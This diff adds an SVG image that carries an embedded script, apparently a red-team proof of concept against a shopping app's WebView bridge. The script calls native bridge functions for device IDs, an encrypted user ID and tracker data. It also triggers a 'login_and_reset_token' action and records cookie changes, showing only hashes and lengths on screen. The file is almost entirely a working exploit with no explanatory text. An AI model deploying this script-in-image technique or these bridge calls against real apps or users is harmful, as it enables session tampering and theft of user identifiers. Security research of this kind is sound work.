@@ -1,0 +1,63 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="2200">
+  <rect width="100%" height="100%" fill="white"/>
+  <text id="out" x="24" y="48" font-family="monospace" font-size="28" fill="black">probe_start</text>
+  <script><![CDATA[
+(function () {
+  const out = document.getElementById('out');
+  let y = 48;
+  function line(s) {
+    const t = document.createElementNS('http://www.w3.org/2000/svg', 'tspan');
+    y += 40;
+    t.setAttribute('x', '24');
+    t.setAttribute('y', String(y));
+    t.textContent = s.slice(0, 92);
+    out.appendChild(t);
+  }
+  function hex(buf) {
+    return Array.from(new Uint8Array(buf)).map(function (b) { return b.toString(16).padStart(2, '0'); }).join('');
+  }
+  async function digest16(value) {
+    const data = new TextEncoder().encode(value || '');
+    const hash = await crypto.subtle.digest('SHA-256', data);
+    return hex(hash).slice(0, 16);
+  }
+  async function cookieSummary(label) {
+    const raw = document.cookie || '';
+    const names = raw ? raw.split(';').map(function (x) { return x.trim().split('=')[0]; }).filter(Boolean).sort().join(',') : '';
+    line(label + ': cookie_present=' + (!!raw) + ' cookie_len=' + raw.length + ' names=' + names + ' sha16=' + await digest16(raw));
+  }
+  function safeStringCall(name) {
+    try {
+      if (!window.WE || typeof WE.triggerString !== 'function') {
+        line('triggerString:' + name + ':missing');
+        return;
+      }
+      const value = String(WE.triggerString(name, '') || '');
+      digest16(value).then(function (h) { line('triggerString:' + name + ':len=' + value.length + ':sha16=' + h); });
+    } catch (e) {
+      line('triggerString:' + name + ':error=' + String(e && e.message || e));
+    }
+  }
+  async function run() {
+    line('href=' + location.href);
+    line('host=' + location.hostname);
+    line('hasWE=' + (!!window.WE));
+    line('hasTrigger=' + (!!(window.WE && WE.trigger)));
+    line('hasTriggerString=' + (!!(window.WE && WE.triggerString)));
+    await cookieSummary('before');
+    ['get_shop_device_id', 'get_hash_device_id', 'get_encrypt_uid', 'get_plugin_info', 'get_tracker_data'].forEach(safeStringCall);
+    try {
+      const payload = JSON.stringify({ sid: 'eshopmobile', domain: location.hostname, callback: 'redsecNoop' });
+      const ok = WE.trigger('login_and_reset_token', payload, 'redsec_token_cookie');
+      line('login_and_reset_token_called=' + (!!ok));
+    } catch (e) {
+      line('login_and_reset_token_error=' + String(e && e.message || e));
+    }
+    setTimeout(function () { cookieSummary('after_1500ms'); }, 1500);
+    setTimeout(function () { cookieSummary('after_3500ms'); }, 3500);
+    setTimeout(function () { cookieSummary('after_7000ms'); }, 7000);
+  }
+  setTimeout(run, 800);
+})();
+  ]]></script>
+</svg>
